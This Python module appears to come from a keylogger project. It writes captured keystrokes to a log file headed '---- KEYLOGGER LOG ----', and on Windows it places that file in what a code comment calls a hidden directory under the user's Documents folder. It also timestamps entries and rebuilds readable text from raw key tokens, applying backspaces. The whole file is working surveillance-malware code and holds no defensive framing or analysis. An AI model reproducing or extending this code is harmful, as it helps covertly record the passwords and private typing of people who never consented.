import os
import re
from datetime import datetime

from constants import LOGS_DIR, VERBOSE
from keylogger_utils import is_windows


def write_to_log(message: str, log_name: str) -> bool:
    """
    Writes a message to a log file.

    Parameters:
        - message (str): The message to be written to the log file.
        - log_name (str): The name of the log file.

    Returns:
        - (bool): True if the message was successfully written to the log file, False otherwise.
    """
    try:
        log_path = os.path.join(LOGS_DIR, log_name)
        log_dir = os.path.dirname(log_path)  # Get the directory from the path

        if is_windows():
            # Get the path to the user's "Documents" directory
            documents_dir = os.path.join(os.path.expanduser('~'), 'Documents')

            # Define the name of the hidden directory
            hidden_dir_name = LOGS_DIR

            # Create the full path to the hidden directory
            log_dir = os.path.join(documents_dir, hidden_dir_name)
            log_path = os.path.join(log_dir, log_name)

        if not os.path.exists(log_dir):
            os.makedirs(log_dir)
            if VERBOSE:
                print("Directory {} created successfully!".format(log_dir))

        if not os.path.exists(log_path):
            with open(log_path, 'w') as f:
                f.write('---- KEYLOGGER LOG ----\n')

        with open(log_path, 'a') as f:
            f.write(message + '\n')

        return True
    except Exception as e:
        if VERBOSE:
            print(e)
        return False


def format_message(content: str) -> str:
    """
    Format a message with the current date and a separator.

    Parameters:
        - content (str): The content of the message.

    Returns:
        - (str): The formatted message with the current date and separator.
    """
    date = 'DATE: {}'.format(datetime.today().strftime('%Y-%m-%d %H:%M:%S'))
    sep = '\n# ---------------------------------------------- #\n'

    return '{date}{sep}{content}{sep}\n'.format(date=date,
                                                content=content,
                                                sep=sep)


def process_keys(typed_keys: str) -> str:
    """
    Process the given string of typed keys and return a more legible version of it.

    Parameters:
        - typed_keys (str): A string representing the typed keys.

    Returns:
        - (str): A string representing the processed keys.
    """

    processed_keys = re.sub(r'\[SPACE\]', ' ', typed_keys)
    processed_keys = re.sub(r'\[BACKSPACE\]', '^', processed_keys)
    processed_keys = re.sub(r'\[.*?\]', '', processed_keys)

    processed_keys = list(processed_keys)
    i = 0
    while i < len(processed_keys):
        if processed_keys[i] == '^':
            if i - 1 >= 0:
                processed_keys.pop(i - 1)
                processed_keys.pop(i - 1)
                i -= 1
            else:
                processed_keys.pop(i)
        else:
            i += 1

    return ''.join(processed_keys)
